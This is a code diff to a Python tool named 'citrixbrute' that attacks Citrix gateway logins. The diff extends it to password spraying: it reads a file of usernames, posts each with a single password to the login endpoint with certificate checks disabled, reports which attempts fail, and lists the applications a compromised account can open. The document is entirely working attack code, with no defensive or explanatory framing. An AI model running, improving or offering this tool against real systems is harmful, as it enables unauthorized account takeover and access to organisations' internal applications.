@@ -24,14 +24,13 @@ class citrixbrute():
        resp3 = c.get(config["protocol"] + '://'+ config["HOST"] + ':' + config["port"] + '/Citrix/XenAppCAGProd23/site/default.aspx?CTX_MessageType=INFORMATION&CTX_MessageKey=WorkspaceControlReconnectPartialTemp', cookies=cookies2, allow_redirects=False, verify=False)
        m = re.search('There are no resources currently available for this user.', resp3.text)
        if m:
-           print("[-]  No resources available for user.")
+           print("[-]      No resources available for user.")
        else:
            m = re.findall('<span>(.*?)</span>', resp3.text, re.DOTALL)
-           print("[+]  The following apps are accessible to " + config["USERNAME"] + ":")
+           print("[+]      The following apps are accessible to " + config["USERNAME"] + ":")
            for n in m:
                if n not in self.ignore:
                    print('[+]                 ' + n)
-                   #appsAvail = g.split('>')
     def connectTest(self, config, payload):
         with session() as c:
            cpost = c.post(config["protocol"] + '://' + config["HOST"] + ":" + config["port"] + '/cgi/login', data=payload, allow_redirects=True, verify=False)
@@ -45,8 +44,18 @@ class citrixbrute():
            else:
                print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
     def payload(self, config):
-        payload = {
-        'login': config["USERNAME"],
-        'passwd': config["PASSWORD"]
-        }
-        self.connectTest(config, payload)
+                if config["UserFile"]:
+                        lines = [line.rstrip('\n') for line in open(config["UserFile"])]
+                        for line in lines:
+                            config["USERNAME"] = line.strip('\n')
+                            payload = {
+                                'login': config["USERNAME"],
+                                'passwd': config["PASSWORD"]
+                                }
+                            self.connectTest(config, payload)
+                else:
+                    payload = {
+                        'login': config["USERNAME"],
+                        'passwd': config["PASSWORD"]
+                        }
+                    self.connectTest(config, payload)
